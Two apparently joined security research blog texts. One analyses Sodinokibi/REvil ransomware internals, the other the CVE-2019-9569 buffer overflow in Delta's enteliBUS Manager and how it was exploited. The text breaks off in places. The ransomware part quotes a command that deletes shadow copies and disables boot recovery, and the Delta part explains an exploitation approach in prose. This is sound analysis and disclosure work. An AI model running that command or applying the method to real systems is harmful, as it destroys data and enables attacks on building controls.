Since its arrival in April 2019, it has become very clear that the new kid in town, “Sodinokibi” or “REvil” is a serious threat. The name Sodinokibi was discovered in the hash ccfde149220e87e97198c23fb8115d5a where ‘Sodinokibi.exe’ was mentioned as the internal file name; it is also known by the name of REvil.
:\/:
At first, Sodinokibi ransomware was observed propagating itself by exploiting a vulnerability in Oracle’s WebLogic server. However, similar to some other ransomware families, Sodinokibi is what we call a Ransomware-as-a-Service (RaaS), where a group of people maintain the code and another group, known as affiliates, spread the ransomware.
:\/:
This model allows affiliates to distribute the ransomware any way they like. Some affiliates prefer mass-spread attacks using phishing-campaigns and exploit-kits, where other affiliates adopt a more targeted approach by brute-forcing RDP access and uploading tools and scripts to gain more rights and execute the ransomware in the internal network of a victim. We have investigated several campaigns spreading Sodinokibi, most of which had different modus operandi but we did notice many started with a breach of an RDP server.
:\/:
Who is the target? Mostly organizations, though it really depends on the skills and expertise from the different affiliate groups on who, and in which geo, they operate.
:\/:
In this first episode, we will dig into the code and explain the inner workings of the ransomware once it has executed on the victim’s machine.
:\/:
Overall the code is very well written and designed to execute quickly to encrypt the defined files in the configuration of the ransomware. The embedded configuration file has some interesting options which we will highlight further in this article.
:\/:
Based on the code comparison analysis we conducted between GandCrab and Sodinokibi we consider it a likely hypothesis that the people behind the Sodinokibi ransomware may have some type of relationship with the GandCrab crew.
:\/:
The main goal of this malware, as other ransomware families, is to encrypt your files and then request a payment in return for a decryption tool from the authors or affiliates to decrypt them. 
:\/:
The malware sample we researched is a 32-bit binary, with an icon in the packed file and without one in the unpacked file. The packer is programmed in Visual C++ and the malware itself is written in pure assembly.
:\/:
The goal of the packer is to decrypt the true malware part and use a RunPE technique to run it from memory. To obtain the malware from memory, after the decryption is finished and is loaded into the memory, we dumped it to obtain an unpacked version.
:\/:
The first action of the malware is to get all functions needed in runtime and make a dynamic IAT to try obfuscating the Windows call in a static analysis.
:\/:
The next action of the malware is trying to create a mutex with a hardcoded name. It is important to know that the malware has 95% of the strings encrypted inside. Consider that each sample of the malware has different strings in a lot of places; values as keys or seeds change all the time to avoid what we, as an industry do, namely making vaccines or creating one decryptor without taking the values from the specific malware sample to decrypt the strings.
:\/:
If the mutex exists, the malware finishes with a call to “ExitProcess.” This is done to avoid re-launching of the ransomware.
:\/:
After this mutex operation the malware calculates a CRC32 hash of a part of its data using a special seed that changes per sample too. This CRC32 operation is based on a CRC32 polynomial operation instead of tables to make it faster and the code-size smaller.
:\/:
The next step is decrypting this block of data if the CRC32 check passes with success. If the check is a failure, the malware will ignore this flow of code and try to use an exploit as will be explained later in the report.
:\/:
In the case that the malware passes the CRC32 check and decrypts correctly with a key that changes per sample, the block of data will get a JSON file in memory that will be parsed. This config file has fields to prepare the keys later to encrypt the victim key and more information that will alter the behavior of the malware.
:\/:
The CRC32 check avoids the possibility that somebody can change the crypted data with another config and does not update the CRC32 value in the malware.
:\/:
After decryption of the JSON file, the malware will parse it with a code of a full JSON parser and extract all fields and save the values of these fields in the memory.
:\/:
pk -> This value encoded in base64 is important later for the crypto process; it is the public key of the attacker.
:\/:
sub -> The subaccount or campaign id for this sample that the affiliate uses to keep track of its payments.
:\/:
dbg -> Debug option. In the final version this is used to check if some things have been done or not; it is a development option that can be true or false. In the samples in the wild it is in the false state. If it is set, the keyboard check later will not happen. It is useful for the malware developers to prove the malware works correctly in the critical part without detecting his/her own machines based on the language.
:\/:
fast -> If this option is enabled, and by default a lot of samples have it enabled, the malware will crypt the first 1 megabyte of each target file, or all files if it is smaller than this size. In the case that this field is false, it will crypt all files.
:\/:
wipe -> If this option is ‘true’, the malware will destroy the target files in the folders that are described in the json field “wfld”. This destruction happens in all folders that have the name or names that appear in this field of the config in logic units and network shares. The overwriting of the files can be with trash data or null data, depending of the sample.
:\/:
wht -> This field has some subfields: fld -> Folders that should not be crypted; they are whitelisted to avoid destroying critical files in the system and programs. fls -> List of whitelists of files per name; these files will never be crypted and this is useful to avoid destroying critical files in the system. ext -> List of the target extensions to avoid encrypting based on extension.
:\/:
prc -> List of processes to kill for unlocking files that are locked by this/these program/s, for example, “mysql.exe”.
:\/:
dmn -> List of domains that will be used for the malware if the net option is enabled; this list can change per sample, to send information of the victim.
:\/:
net -> This value can be false or true. By default, it is usually true, meaning that the malware will send information about the victim if they have Internet access to the domain list in the field “dmn” in the config.
:\/:
nbody -> A big string encoded in base64 that is the template for the ransom note that will appear in each folder where the malware can create it.
:\/:
nname -> The string of the name of the malware for the ransom note file. It is a template that will have a part that will be random in the execution.
:\/:
exp -> This field is very important in the config. By default it will usually be ‘false’, but if it is ‘true’, or if the check of the hash of the config fails, it will use the exploit CVE-2018-8453. The malware has this value as false by default because this exploit does not always work and can cause a Blue Screen of Death that avoids the malware’s goal to encrypt the files and request the ransom. If the exploit works, it will elevate the process to SYSTEM user.
:\/:
img -> A string encoded in base64. It is the template for the image that the malware will create in runtime to change the wallpaper of the desktop with this text.
:\/:
After decrypting the malware config, it parses it and the malware will check the “exp” field and if the value is ‘true’, it will detect the type of the operative system using the PEB fields that reports the major and minor version of the OS.
:\/:
Usually only one OS can be found but that is enough for the malware. The malware will check the file-time to verify if the date was before or after a patch was installed to fix the exploit. If the file time is before the file time of the patch, it will check if the OS is 64-bit or 32-bit using the function “GetSystemNativeInfoW”. When the OS system is 32-bit, it will use a shellcode embedded in the malware that is the exploit and, in the case of a 64-bit OS, it will use another shellcode that can use a “Heaven´s Gate” to execute code of 64 bits in a process of 32 bits.
:\/:
In the case that the field was false, or the exploit is patched, the malware will check the OS version again using the PEB. If the OS is Windows Vista, at least it will get from the own process token the level of execution privilege. When the discovered privilege level is less than 0x3000 (that means that the process is running as a real administrator in the system or SYSTEM), it will relaunch the process using the ‘runas’ command to elevate to 0x3000 process from 0x2000 or 0x1000 level of execution. After relaunching itself with the ‘runas’ command the malware instance will finish.
:\/:
The malware’s next action is to check if the execute privilege is SYSTEM. When the execute privilege is SYSTEM, the malware will get the process “Explorer.exe”, get the token of the user that launched the process and impersonate it. It is a downgrade from SYSTEM to another user with less privileges to avoid affecting the desktop of the SYSTEM user later.
:\/:
After this it will parse again the config and get information of the victim’s machine This information is the user of the machine, the name of the machine, etc. The malware prepares a victim id to know who is affected based in two 32-bit values concat in one string in hexadecimal.
:\/:
The first part of these two values is the serial number of the hard disk of the Windows main logic unit, and the second one is the CRC32 hash value that comes from the CRC32 hash of the serial number of the Windows logic main unit with a seed hardcoded that change per sample.
:\/:
After this, the result is used as a seed to make the CRC32 hash of the name of the processor of the machine. But this name of the processor is not extracted using the Windows API as GandCrab does; in this case the malware authors use the opcode CPUID to try to make it more obfuscated.
:\/:
Later, during the execution, the malware will write in the Windows registry the next entries in the subkey “SOFTWARE\recfg” (this subkey can change in some samples but usually does not).
:\/:
0_key -> Type binary; this is the master key (includes the victim’s generated random key to crypt later together with the key of the malware authors).
:\/:
sk_key -> As 0_key entry, it is the victim’s private key crypted but with the affiliate public key hardcoded in the sample. It is the key used in the decryptor by the affiliate, but it means that the malware authors can always decrypt any file crypted with any sample as a secondary resource to decrypt the files.
:\/:
stat -> The information gathered from the victim machine and used to put in the ransom note crypted and in the POST send to domains.
:\/:
rnd_ext -> The random extension for the encrypted files (can be from 5 to 10 alphanumeric characters).
:\/:
The malware tries to write the subkey and the entries in the HKEY_LOCAL_MACHINE hive at first glance and, if it fails, it will write them in the HKEY_CURRENT_USER hive.
:\/:
The information that the malware gets from the victim machine can be the user name, the machine name, the domain where the machine belongs or, if not, the workgroup, the product name (operating system name), etc.
:\/:
After this step is completed, the malware will check the “dbg” option gathered from the config and, if that value is ‘true’, it will avoid checking the language of the machine but if the value is ‘false’ ( by default), it will check the machine language and compare it with a list of hardcoded values.
:\/:
The malware checks against the next list of blacklisted languages (they can change per sample in some cases):
:\/:
We observed that Sodinokibi, like GandCrab and Anatova, are blacklisting the regular Syrian language and the Syrian language in Arabic too. If the system contains one of these languages, it will exit without performing any action. If a different language is detected, it will continue in the normal flow.
:\/:
This is interesting and may hint to an affiliate being involved who has mastery of either one of the languages. This insight became especially interesting later in our investigation.
:\/:
If the malware continues, it will search all processes in the list in the field “prc” in the config and terminate them in a loop to unlock the files locked for this/these process/es.
:\/:
After this it will destroy all shadow volumes of the victim machine and disable the protection of the recovery boot with this command:
:\/:
exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures
:\/:
Next it will check the field of the config “wipe” and if it is true will destroy and delete all files with random trash or with NULL values. If the malware destroys the files , it will start enumerating all logic units and finally the network shares in the folders with the name that appear in the config field “wfld”.
:\/:
In the case where an affiliate creates a sample that has defined a lot of folders in this field, the ransomware can be a solid wiper of the full machine.
:\/:
The next action of the malware is its main function, encrypting the files in all logic units and network shares, avoiding the white listed folders and names of files and extensions, and dropping the ransom note prepared from the template in each folder.
:\/:
After finishing this step, it will create the image of the desktop in runtime with the text that comes in the config file prepared with the random extension that affect the machine.
:\/:
The next step is checking the field “net” from the config, and, if true, will start sending a POST message to the list of domains in the config file in the field “dmn”.
:\/:
This part of the code has similarities to the code of GandCrab, which we will highlight later in this article.
:\/:
After this step the malware cleans its own memory in vars and strings but does not remove the malware code, but it does remove the critical contents to avoid dumps or forensics tools that can gather some information from the RAM.
:\/:
If the malware was running as SYSTEM after the exploit, it will revert its rights and finally finish its execution.
:\/:
Using the unpacked Sodinokibi sample and a v5.03 version of GandCrab, we started to use IDA and BinDiff to observe any similarities. Based on the Call-Graph it seems that there is an overall 40 percent code overlap between the two:
:\/:
The most overlap seems to be in the functions of both families. Although values change, going through the code reveals similar patterns and flows:
:\/:
We already mentioned that the code part responsible for the random URL generation has similarities with regards to how it is generated in the GandCrab malware. Sodinokibi is using one function to execute this part where GandCrab is using three functions to generate the random URL. Where we do see some similar structure is in the parts for the to-be-generated URL in both malware codes. We created a visual to explain the comparison better:
:\/:
We observe how even though the way both ransomware families generate the URL might differ, the URL directories and file extensions used have a similarity that seems to be more than coincidence. This observation was also discovered by Tesorion in one of its 
:\/:
Overall, looking at the structure and coincidences, either the developers of the GandCrab code used it as a base for creating a new family or, another hypothesis, is that people got hold of the leaked GandCrab source code and started the new RaaS Sodinokibi.
:\/:
We executed an in-depth analysis comparing GandCrab and Sodinokibi and discovered a lot of similarities, indicating the developer of Sodinokibi had access to GandCrab source-code and improvements. The Sodinokibi campaigns are ongoing and differ in skills and tools due to the different affiliates operating these campaigns, which begs more questions to be answered. How do they operate? And is the affiliate model working? McAfee ATR has the answers in episode 2, “

Management. Control. It seems that you can’t stick five people in a room together without one of them trying to order the others around. This tendency towards centralized authority is not without reason, however – it is often more efficient to have one person, or thing, calling the shots. For an example of the latter, one needs look no further than Delta’s enteliBUS Manager, or eBMGR. Put simply, this device aims to centralize control for various pieces of hardware often found in corporate or industrial settings, whether it be temperature and humidity controls for a server room, a boiler and its corresponding alarms and sensors in a factory, or access control and lighting in a business. The advantages seem obvious, too – it can be configured to adjust fan speeds according to thermostat readings or sound an alarm if pressure crosses a certain threshold, all with little human interaction.
:\/:
The disadvantages, while less obvious, become clear when one considers tech-savvy malicious actors. Suddenly, your potentially critical system now has a single point of failure, and one that is attached to a network, to make matters worse.
:\/:
Consider for a moment a positive pressure room in a hospital, the kind typically used to keep out contaminants during surgeries. Managing rooms such as these is a typical application for the eBMGR and it does not take an overactive imagination to envision what kind of damage a bad actor could cause if they disrupted such a sensitive environment.
:\/:
Management. Control. That’s what’s at stake if a device such as this is not properly secured. It’s also what made this device such a high priority for McAfee’s Advanced Threat Research team. The decision to make network-connected critical systems such as these demands an extremely high standard of software security – finding where it might fall short is precisely our job.
:\/:
With these stakes in mind, our team went to work. We began by hooking up an eBMGR unit to a network with several other devices to simulate an environment somewhat true to life. Using a technique known as “fuzzing”, we then blasted the device with all kinds of deliberately malformed network traffic, looking for a chink in the armor. That is one advantage often afforded to the bad guys in software security; they can make many mistakes; manufacturers need only make one.
:\/:
Perhaps unsurprisingly, persistence and creativity led us to discover one such mistake: a mismatch in the memory sizes used to handle incoming network data created what is often referred to as a buffer overflow vulnerability. This seemingly innocuous mistake rendered the eBMGR vulnerable to our carefully crafted network attack, which allows a hacker on the same network to gain complete control of the device’s operating system. Worse still, the attack uses what is known as broadcast traffic, meaning they can launch the attack without knowing the location of the targets on the network. The result is a twisted version of Marco Polo – the hacker needs only shout “Marco!” into the darkness and wait for the unsuspecting targets to shout “Polo!” in response.
:\/:
In this field, complete control of the operating system is typically the finish line. But we weren’t content with just that. After all, controlling the eBMGR on its own is not all that interesting; we wanted to see if we could use it to control all the devices it was connected to. Unfortunately, we did not have the source code for the device’s software, so this new goal proved non-trivial.
:\/:
We went back to the drawing board and acquired some additional hardware that the Delta device might realistically be charged with managing and had a certified technician program the device just as he would for a real-world client – in our case, as an HVAC controller. Our strategy quickly became what is often referred to as a replay attack. As an example, if we wanted to determine how to tell the device to flip a switch, we would first observe the device flipping the switch in the “normal” way and try to track down what code had to run for that to happen. Next, we would try to recreate those conditions by running that code manually, thus 
:\/:
 the previously observed event. This strategy proved effective in granting us control over every category of device the eBMGR supports. Moreover, this method remains agnostic to the specific hardware attached to the building manager. Hypothetically, this sort of attack would work without any prior knowledge of the device’s configuration.
:\/:
The result was an attack that would compromise any enteliBUS Manager on the same network and attach a custom piece of malware we developed to the software running on it. This malware would then create a backdoor which would allow the attacker to remotely issue commands to the manager and control any hardware connected to it, whether it be something as benign as a light switch or as dangerous as a boiler.
:\/:
To make matters worse, if the attacker knows the IP address of the device ahead of time, this exploit can be performed over the Internet, increasing its impact exponentially. At the time of this writing, a Shodan scan revealed that over 1600 such devices are internet connected, meaning the danger is far from hypothetical.
:\/:
For those craving the nitty-gritty technical details of how we went about accomplishing this, we also published what is arguably a novella 
:\/:
, we reached out to Delta Controls as soon as we confirmed that the initial vulnerability we discovered was exploitable. Shortly thereafter, they provided us with a beta version of a patch meant to fix the vulnerability and we confirmed that it did just that – our attack no longer worked. Furthermore, by using our understanding of how the attack is performed at a network level, we were able to add mitigation for this vulnerability to McAfee’s Network Security Platform (NSP) via NSP signature 0x45d43f00, helping our customers remain secure. This is our idea of a success story – researchers and vendors coming together to improve security for end users and ultimately reduce the attack surface for the adversary. If there’s any doubt they are interested in targets like these, a quick search will illuminate 
:\/:
Before we leave you with “all’s well that ends well”, we want to stress that there is a lesson to be learned here: it doesn’t take much to make a critical system vulnerable. Thus, it is important that companies extend proper security practices to all network-connected devices – not just PCs. Such practices might include placing all internet-connected devices behind a firewall, monitoring traffic to these devices, segregating them from the rest of the network using VLANs, and staying on top of security updates. For critical systems that cannot afford significant downtime, updates are often pulled instead of pushed, putting the onus on end users to keep these devices up to date. Whatever the precise implementation may be, a good security policy often begins by adopting the 
:\/:
, or the idea that all access should be restricted by default unless there is a compelling reason for it. For example, before approaching the challenge of keeping a device like the eBMGR secure on the internet, it’s important to first ask if having it connected to internet is necessary in the first place.
:\/:
While companies and consumers should certainly take the proper steps to keep their networks secure, manufacturers must also take a proactive approach towards addressing vulnerabilities that impact their end users. Delta Controls’ willingness to collaborate and timely response to our disclosure certainly seems like a step in the right direction. Please refer to the following 
:\/:
 from Delta Controls which provides insight into the collaboration with McAfee and the power of responsible disclosure.
:\/:
The McAfee Labs Advanced Threat Research team is committed to uncovering security issues in both software and hardware to help developers provide safer products for businesses and consumers. We recently investigated an industrial control system (ICS) produced by Delta Controls. The product, called “enteliBUS Manager”, is used for several applications, including building management. Our research into the Delta controller led to the discovery of an unreported buffer overflow in the “main.so” library. This flaw, identified by CVE-2019-9569, ultimately allows for remote code execution, which could be used by a malicious attacker to manipulate access control, pressure rooms, HVAC and more. We reported this research to Delta Controls on December 7
:\/:
, 2018. Within just a few weeks, Delta responded, and we began an ongoing dialog while a security fix was built, tested and rolled out in late June of 2019. We commend Delta for their efforts and partnership throughout the entire process.
:\/:
The vulnerable firmware version tested by McAfee’s Advanced Threat Research team is 3.40.571848. It is likely earlier versions of the firmware are also vulnerable, however ATR has not specifically tested these. We have confirmed the patched firmware version 3.40.612850 effectively remediates the vulnerability.
:\/:
This blog is intended to provide a deep and thorough technical analysis of the vulnerability and its potential impact. For a high-level, non-technical walk through of this vulnerability, please refer to our summary blog post 
:\/:
The first task when researching a new device is to understand how it works from both a software and hardware perspective. Like many devices in the ICS realm, this device has three main software components; the bootloader, system applications, and user-defined programming. While looking at software for an attack vector is important, we do not focus on any surface which is defined by the users since this will potentially change for every install. Therefore, we want to focus on the bootloader and the system applications. With the operating system, it is common for manufacturers to implement custom code to operate the device regardless of an individual user’s programming. This custom code is often where most vulnerabilities exist and extends across the entire product install base. Yet, how do we access this code? As this is a critical system, the firmware and software are not publicly available and there is limited documentation. Thus, we are limited to external reconnaissance of the underlying system software. Since the most critical vulnerabilities are remote, it made sense to start with a simple network scan of the device. A TCP scan showed no ports open and a UDP scan only showed ports 47808 and 47809 to be open. Referring to the documentation, we determined this is most likely used for a protocol called Building Automation Control Network (BACnet). Using a BACnet-specific network enumeration script, we determined slightly more information:
:\/:
The next question is, what can we learn from the hardware? To answer this question, the device was first carefully disassembled, as shown in Figure 1.
:\/:
The controller has one board to manage the display and a main baseboard which holds a System on a Module (SOM) chip containing both the processor and flash modules. With a closer look at the baseboard, we made a few key observations. First, the processor is an ARM926EJ core processor, the flash module is a ball grid array (BGA) chip, and there are several unpopulated headers on the board.
:\/:
To examine the software more effectively, we needed to determine a method of extracting the firmware. The BGA chip used by the system for flash memory will mostly likely hold the firmware; however, this poses another challenge. Unlike other chips, BGA chips do not provide pins externally which can be attached to. This means to access the chip directly, we would need to desolder the chip from the board. This is not ideal since we risk damaging the system.
:\/:
We also noticed several unpopulated headers on the board. This was promising as we could find an alternative method of exacting the firmware using one of these headers. Soldering pins to each of the unpopulated headers and using a logic analyzer, we determined that the 4-pin header in the center of the board is a universal asynchronous receiver-transmitter (UART) header running at a baud rate of 115200.
:\/:
 team) to connect to the UART headers, we were met with an unprotected root prompt on the system. Now with full access to the system, we could start to gain a deeper understanding of how the system works and extract the firmware.
:\/:
With the UART interface, we could now explore the system in real-time, but how could we extract the firmware for offline analysis? The device has two USB ports which we were able to use to mount a USB drive. This allowed us to copy what is running in memory using 
:\/:
Using “/proc/mtd” to gain information about how memory is partitioned, we could see file systems located on mtd4 and mtd5. We used 
:\/:
 to copy off both the mtd4 and mtd5 partitions. We later discovered that one of the images is a backup used as a system fall back if a persistent issue is detected. This filesystem copied became increasingly useful as the project continued
:\/:
With the active UART connection, it was now possible to investigate more about how the system is running. Since we were able to previously determine the device is only listening on ports 47808 and 47809, whichever application is listening on these ports would be the only point of an attack for a remote exploit. This was quickly confirmed using “netstat -nap” from the UART console.
:\/:
We noticed that port 47808 was being used by an application called “dactetra”. With minimal further investigation, it was determined that this is a Delta-controller-specific binary was responsible for the main functions of the device.
:\/:
With a device-specific binary listening on the network via an open port, we had an ideal place to start looking for a vulnerability. We used the common approach of network fuzzing to start our investigation. To implement network fuzzing for BACnet, we turned to a tool produced by Synopsys called Defensics, which has a module designed for BACnet servers. Although this device is not a BACnet server and functions more as a router, this test suite provided several universal test cases which gave us a great place to start. BACnet utilizes several types of broadcast packets to communicate. Two such broadcast packets, “Who-Is” and “I-Am” packets, are universal to all BACnet devices and Defensics provides modules to work with them. Using the Defensics fuzzer to create mutations of these packets, we were able to observe the device encountering a failure point, producing a core dump and immediately rebooting, shown in Figure 5.
:\/:
The test case which caused the crash was then isolated and run several more times to confirm the crash was repeatable. We discovered during this process that it takes an additional 96 packets sent after the original malformed packet to cause the crash. The malformed packet in the series was an “I-Am” packet, as seen below. The full packet is not shown due to its size.
:\/:
Examining further, we could quickly see that the fuzzer created a packet with a BACnet layer size of 8216 bytes, using “0x22”. We could also see the fuzzer recognized the max acceptable size for the BACnet application layer as only 1476 bytes. Additional testing showed that sending only this packet did not produce the same results; only when all 97 packets were sent did the crash occur.
:\/:
Since the system provides a core dump upon crashing, it was logical to analyze it for further information. From the core dump (reproduced in Figure 7), we could see the device encountered a 
:\/:
. We also saw that register R0 contained what looked like data copied from our malformed packet, along with the backtrace being potentially corrupted.
:\/:
The core dump also provided us the precise location of the crash. Using the memory map from the device, it was possible to determine that address 0x4026e580 is located in 
:\/:
. Since the device does not deploy Address Space Layout Randomization (ASLR), the memory address did not change throughout our testing. As we had successfully extracted the firmware, we used IDA Pro to attempt to learn more about why this crash was occurring. The developers did not strip the binaries during compiling time, which helped simplify the reversing process in IDA.
:\/:
The disassembly told us that memcpy was attempting to write what was in R3 to the “address” stored in R0. In this case, however, we had corrupted that address, causing the segmentation fault. The contents of several other registers also provided additional information. The value 0x81 in R3 was potentially the first byte of a BACnet packet from the BACnet Virtual Link Control (BVLC) layer, identifying the packet as BACnet. By looking at R3 and the values at the address in R5 together, we confirmed with more certainty that this was in fact the BVLC layer. This implied the data being copied was from the last packet sent and the destination for the copied data was taken from the first malformed packet. Registers R8 and R10 held the source and destination port numbers, respectively, which in this case were both 0xBAC0 (accounting for endianness), or 47808, the standard BACnet port. R4 held a memory address which, when examined, showed a section of memory that looks to have been overwritten. Here we saw data from our malformed packet (0x22); in some areas, memory was partially overwritten with our packet data. The value for the destination of the memcpy appeared to be coming from this region of memory. With no ASLR enabled, we could again count on this always landing in the same location.
:\/:
At this point, with the information provided by the core dump, packets, and IDA, we were fairly certain that the crash found was a buffer overflow. However, memcpy is a very common function, so we needed to determine where exactly this crash was coming from. If the destination address for the memcpy was getting corrupted, then the crash in memcpy was simply collateral damage from the buffer overflow – so what code was causing the buffer overflow to occur? A good place to start this analysis would be the backtrace; however, as seen above, the backtrace was corrupted from our input. Since this device uses an ARM processor, we could look at the LR registers for clues on what code called this memcpy. Here, LR was pointing to 0x401e68a8 which, when referencing the memory map of the process, falls in “main.so”. After calculating the offset to use for static analysis, we arrived at the code in Figure 10.
:\/:
The LR register was pointing to the instruction which is called after memcpy returns. In this case, we were interested in the instruction right before the address LR is pointing to, at offset 0x15C8A4. At first glance, we were surprised not to see the expected memcpy call; however, digging a little deeper into the scNetMove function we found that scNetMove is simply a wrapper for memcpy.
:\/:
So, how did the wrong destination address get passed to memcpy? To answer this, we needed a better understanding of how the system processes incoming packets along with what code is responsible for setting up the buffers sent to memcpy. We can use 
:\/:
The function wherein we found the “scNetMove” was called “scBIPRxTask” and was only referenced in one other location outside of the main binary; the initialization function for the application’s networking, shown in Figure 12.
:\/:
In scBIPRxTask’s disassembly, we saw a new thread or “task” being created for both BACnet IP interfaces on ports 47808 and 47809. These spawned threads would handle all the incoming packets on their respective ports. When a packet would be received by the system, the thread responsible for scBIPRxTask would trigger for each packet. Using the IDA Pro decompiler, we could see what occurs for each packet. First, the function uses 
:\/:
 to zero out an allocated buffer on the stack and read from the network socket into this buffer. This buffer becomes the source for the following memcpy call. The new buffer is created with a static size of 1732 bytes and only 1732 bytes are appropriately read from the socket.
:\/:
After reading data from the socket, the function sets up a place to store the packet it has just received. Here it uses a function called “pk_alloc,” which takes the size of the packet to create as its only argument. We noticed that the size was another static value and not the size received from the socket read function. This time the static value passed is 1476 bytes. This allocated buffer is what will become the destination for the memcpy.
:\/:
With both a source and destination buffer allocated, “scNetMove” is called and subsequently memcpy is called, passing both buffers along with the size parameter taken from the socket read return value.
:\/:
This code path explains why and how the vulnerability occurs. For each packet sent, it is copied off the stack into memory; however, if the packet is longer than 1476 bytes, for each byte over 1476 and less than or equal to 1732, that many bytes in memory past the end of the destination buffer are overwritten. Within the memory which is overwritten, there is an address to the destination of a later memcpy call. This means there is a buffer overflow vulnerability that leads to an arbitrary 
:\/:
 condition. The first malformed packet overwrites a section of memory with attacker-defined data – in this case, the address 
:\/:
 the attacker wishes to write to. After an additional 95 packets are read by the system, the address controlled by the attacker will be put into memcpy as the destination buffer. The data in the last packet, which does not need to be malformed, is 
:\/:
 will be written to the location set in the earlier malformed packet. Assuming the last packet is also controlled by the attacker, this is now a 
:\/:
With a firm grasp on the discovered vulnerability, the next logical step was to attempt to create a working exploit. When developing an exploit, the ability to dynamically debug the target is extremely valuable. To this end, the team first had to cross-compile debugging tools such as gdbserver for the device’s specific kernel and architecture. Since the device runs an old version of the Linux kernel, we used an old version of Buildroot to build gdbserver and later other applications.
:\/:
Using a USB drive to transfer gdbserver onto the device, an initial attempt to debug the running application was made. A few seconds after connecting the debugger to the application, the device initiated a reboot, as shown in Figure 16.
:\/:
An error message gave us a clue on why the crash occurred, indicating a watchdog timer failure. Watchdog timers are common in critical embedded devices that if the system hangs for a predetermined amount of time, it takes action to try and correct the problem. In this case, the action chosen by the developers is to reboot the system. Searching the system binaries for this error message revealed the section of code shown in Figure 17.  The actual error messages have been redacted at the request of the vendor.
:\/:
The function is decrementing three counters. If any of the counters ever get to zero, then an error is thrown and later the system is rebooted. Examining the code further shows that multiple processes call this function to check the counters very frequently. This means we are not going to be able to dynamically debug the system without figuring out how to disable this software watchdog.
:\/:
One common approach to this problem is to patch the binaries. It is important when looking at patching a binary to ensure the patch you employ does not introduce any unintended side effects. This generally means you want to make the smallest change possible. In this case, the smallest meaningful change the team came up with was to modify the “subtract by 5” to a “subtract by 0.”  This would not change how the overall program functioned; however, every time the function was called to decrement the counter, the counter would simply never get smaller. The patched code is provided in Figure 18. Notice the IDA decompiler has completely removed the subtraction statement from the code since it is no longer meaningful.
:\/:
With the software watchdog patched, the team attempted to again dynamically debug the application. Initially the test was thought to be successful, since it was possible to connect to gdbserver and start debugging the application. However, after three minutes the system rebooted again. Figure 19 shows the message the team caught on reboot after several repeated experiments with the same results.
:\/:
This indicates that in the boot phase of startup, a hardware watchdog is set to 180 seconds (or three minutes). The system has two watchdog timers, one hardware and one software; we had only disabled one of the timers. The same method of patching the binary which was used to disable the software watchdog timer would not work for the hardware watchdog timer; the application would also need to kick the watchdog to prevent a reboot. Armed with this knowledge, we turned to the Delta binaries on the device for code that could help us “kick” the hardware watchdog. With the debugging symbols left in, it was relatively easy to find a function which was responsible for managing the hardware watchdog.
:\/:
There are several approaches which could be used to attempt to disable the hardware watchdog. In this scenario, we decided to take advantage of the fact that the code which dealt with the hardware watchdog was in a shared library and exported. This allowed for the creation of a new program using the existing watchdog-kicking code. By creating a second program that will kick the hardware watchdog, we could debug the Delta application without the system resetting.
:\/:
This program was put in the init script of the system, so it would run on boot and continually “kick the dog”, effectively disabling the hardware watchdog. Note: no actual dogs were harmed in the research or creation of this exploit. If anything, they were given extra treats and contributed to the coding of the watchdog patch. Here are some very recent photos of this researcher’s dogs for proof.
:\/:
With both the hardware and software watchdog timers pacified, we could continue to determine if our previously discovered vulnerability was exploitable.
:\/:
Before attempting exploitation, we wanted to first investigate if the system had any exploit mitigations or limitations we needed to be aware of. We began by running an open source script called “checksec.sh”. This script, when run on a binary, will report if any of the common exploit mitigations are in place. Figure 21 shows the script’s output when ran on the primary Delta binary, named “dactetra”.
:\/:
The check came back with only NX enabled. This also held true for each of the shared libraries where the vulnerable code is located.
:\/:
As discussed above, the vulnerability allows for a write-what-where condition, which leads us to the most important question: what do we want to write where? Ultimately, we want to write shellcode somewhere in memory and then jump to that shellcode. Since the attacker controls the last packet sent, it is plausible that the attacker could have their shellcode on the stack. If we put shellcode on the stack, we would then have to bypass the No eXecute (NX) protection discovered using the checksec tool. Although this is possible, we wondered if there was a simpler method.
:\/:
Reexamining the crash dump at the memory location which has been overwritten by the large malformed packet, we found a small contiguous section of heap memory, totaling 32 bytes, which the attacker could control. We came to this conclusion because of the presence of 0x22 bytes – the contents of the malformed packet’s payload. At the time the overflow occurs, more of this region is filled with 0x22’s, but by the time our write-what-where condition is triggered, many of these bytes get clobbered, leaving us with the 32-byte section shown in Figure 22.
:\/:
Being heap memory, this region was also executable, a detail that will become important shortly. Replacing the 0x22’s in the malformed packet with a non-repeating pattern both revealed where in the payload to place our shell code and confirmed that the bytes in this region were all unique.
:\/:
With a potential place to put our shellcode, the next major component to address was controlling execution. The write-what-where condition allowed us to write anywhere in memory; however, it did not give us control of execution. One technique to tackle this problem is to leverage the Global Offset Table (GOT). In Linux, the GOT redirects a function pointer to an absolute location and is located in the .got section of an ELF executable or shared object. Since the .got section is written to at execution time, it is generally still writable later during execution. Relocation Read Only (RELRO) is an exploit mitigation which marks the loaded .got section read-only once it is mapped; however, as seen above, this protection was conveniently not enabled. This meant it was possible to use the write-what-were condition to write the address of our shellcode in memory to the GOT, replacing a function pointer of a future function call. Once the replaced function pointer is called, our shellcode would be executed.
:\/:
But which function pointer should we replace? To ensure the highest probability of success, we decided it would be best to replace the pointer to a function that is called as close to the overwrite as possible. This is because we wanted to minimize changes to the memory layout during program execution. Examining the code again from the return of the “scNetMove” function, we see within just a few instructions “scDecodeBACnetUDP” is called. This therefore becomes the ideal choice of pointer to overwrite in the GOT.
:\/:
Knowing what to write where, we next considered any conditions which needed to be met for the correct code path to be taken to trigger the vulnerability. Taking another look at the code in memcpy that allows the buffer overflow to occur, we noticed that the overwrite does indeed have a condition, as shown in Figure 24.
:\/:
The code producing the overwrite in memory is only taken if the value in R0, when bitwise ANDed with the immediate value 3, is not equal to 0. From our crash dump, we knew that the value in R0 is the address of the destination we want to copy to. This potentially posed a problem. If the address we wanted to write to was 4-byte aligned, which was highly likely, the code path for our vulnerability would not be taken. We could ensure that our code path was taken by subtracting one from the address we wish to write to in the GOT and then repairing the last byte of the previous entry. This ensures that the correct code path is taken and that we do not unintentionally damage a second function pointer.
:\/:
While we discovered a place to put our shellcode, we only discovered a very small amount of space, specifically 32 bytes, in which to write the payload, shown in Figure 24. What can we accomplish in such a small amount of space? One method that does not require extensive shellcode is to use a “return to libc” attack to execute the 
:\/:
 must be present on the device by default. Additionally, the command string itself needs to be quite short to accommodate the limited number of bytes we have to work with.
:\/:
